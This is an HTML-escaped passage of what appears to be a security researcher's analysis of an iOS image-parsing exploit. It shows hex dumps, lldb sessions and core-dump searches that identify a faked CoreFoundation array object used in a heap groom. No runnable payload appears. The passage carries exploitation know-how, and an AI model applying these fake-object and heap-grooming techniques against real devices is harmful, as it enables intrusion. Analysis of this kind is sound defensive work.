 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;This dumps the uncompressed TIFF strip buffer and this looks much more interesting! There&amp;#39;s clearly some structure, though not a lot of it. Is this really enough to do something useful? It looks like there could be some sort of object, but I didn&amp;#39;t recognise the structure, and had no idea how replacing an object with this would be useful. I explored two possibilities:&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;XQFzMDWmii-c40&quot; id=&quot;h.w1yajpmi02ag&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c35&quot;&gt;1) Alpha blending:&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;This is actually the raw TIFF strip after decompression but before the rendering step which applies the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Alpha_compositing&quot;&gt;alpha&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;, so it was possible that this got rendered &amp;quot;on top&amp;quot; of another object. That seemed like a reasonable explanation for why the object seemed so sparse; perhaps the idea was to just &amp;quot;move&amp;quot; a pointer value. The first 16 bytes of the strip look like this:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;00 00 00 00 00 00 00 00 84 13 00 00 01 00 00 00&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;which when viewed as two 64-bit values look like this:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;0x0000000000000000 0x0000000100001384&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;It seemed sort-of plausible that rendering the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x100001384&lt;/span&gt;&lt;span&gt;&amp;nbsp;on top of another pointer might be a neat primitive, but there was something that didn&amp;#39;t quite add up. This pointer-&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c24&quot;&gt;ish&lt;/span&gt;&lt;span&gt;&amp;nbsp;value is at the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c24&quot;&gt;start&lt;/span&gt;&lt;span&gt;&amp;nbsp;of the strip buffer, so if the overlapping allocation got reallocated with this strip buffer &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c24&quot;&gt;directly,&lt;/span&gt;&lt;span&gt;&amp;nbsp;nothing interesting would happen, as the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c24&quot;&gt;overlapping&lt;/span&gt;&lt;span&gt;&amp;nbsp;parts are &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c24&quot;&gt;further&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;along. Maybe the overlapping buffer gets split up multiple times, but this was seeming less and less likely, and I couldn&amp;#39;t reproduce this part of the exploit to actually observe what happened.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;XQFzMDWmii-c40&quot; id=&quot;h.xf2e3zlng30e&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c35&quot;&gt;2) This is an object:&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The other theory I had was that this actually was an object. The 8 zero bytes at the start were certainly strange&amp;hellip; &lt;/span&gt;&lt;span&gt;so then&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;what&amp;#39;s the significance of the next 8 bytes?&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;84 13 00 00 01 00 00 00&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;I tried using &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;lldb&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;memory find&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;command to see if there were other instances of that exact byte sequence occurring in a test iOS app rendering the WebP then the TIFF using the CoreGraphics APIs:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;(lldb) memory find -e 0x100001384 -- 0x100000000 0x200000000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;data not found within the range.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Nope, plus it was very, very slow.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;One thing I had noticed was that this byte sequence was similar to one near the start of the 1MB groom object:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000000 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;|................|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000010 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;80 26 00 00 01 00 00 00&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp; |.........&amp;amp;......|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000020 &amp;nbsp;1f 00 00 00 00 00 00 00 &amp;nbsp;10 00 8b 56 02 00 00 00 &amp;nbsp;|...........V....|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000030 &amp;nbsp;b0 c3 31 16 02 00 00 00 &amp;nbsp;60 e3 01 00 00 00 00 00 &amp;nbsp;|..1.....`.......|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;They&amp;#39;re not identical, but it seemed a strange coincidence.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;I took a bunch of test app core dumps using &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;lldb&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;process save-core&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;command and wrote some simple code to search for similar-ish byte patterns. After some experimentation I managed to find something:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;1c7b2600 &amp;nbsp;49 d2 e4 29 02 00 00 01 &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;84 13 00 00 02 00 00 00&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp; |I..)............|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;1c7b2610 &amp;nbsp;42 00 00 00 00 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;|B...............|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;1c7b2620 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;|................|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;1c7b2630 &amp;nbsp;c0 92 d6 83 02 00 00 00 &amp;nbsp;00 93 d6 83 02 00 00 00 &amp;nbsp;|................|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Converting those coredump offsets into VM address and looking them up revealed:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;(lldb) x/10xg 0x121E47600&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x121e47600: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c23&quot;&gt;0x0100000229e4d249&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&amp;nbsp;0x0000000200001384 &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;0x121e47610: 0x0000000000000042 0x0000000000000000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;0x121e47620: 0x0000000000000000 0x0000000000000000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;(lldb) image lookup --address &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c23&quot;&gt;0x229e4d248&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; Address: CoreFoundation[0x00000001dceed248] (CoreFoundation.__DATA_DIRTY.__objc_data + 7800)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; Summary: (void *)0x0000000229e4d0e0: __NSCFArray&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;It&amp;#39;s an &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;NSCFArray&lt;/span&gt;&lt;span&gt;, which is the Foundation (Objective-C) &amp;quot;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://ridiculousfish.com/blog/posts/bridge.html&quot;&gt;toll-free bridged&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;quot; version of the Core Foundation (C) CFArray type! This was the hint that I was looking for to identify the significance of the TIFF and that 1MB groom object, which also contains a similar byte sequence. &lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.udq8imwbq2pa&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;Cores and Foundations&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Even though Apple hasn&amp;#39;t updated the open-source version of CoreFoundation for almost a decade, the old source is still helpful. Here&amp;#39;s what a CoreFoundation object looks like:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;/*&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;CF&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;&amp;quot;instances&amp;quot;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;structure.&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;Never&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;refer&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;to&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;these&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;directly&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;they&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;are&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;CF&amp;#39;s&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;may&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;added&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;or&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;removed&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;or&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;change&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;without&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;warning.&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;Binary&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;compatibility&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;uses&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;not&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;guaranteed&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;from&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;release&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;release.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;*/&lt;/span&gt;&lt;/p&gt;
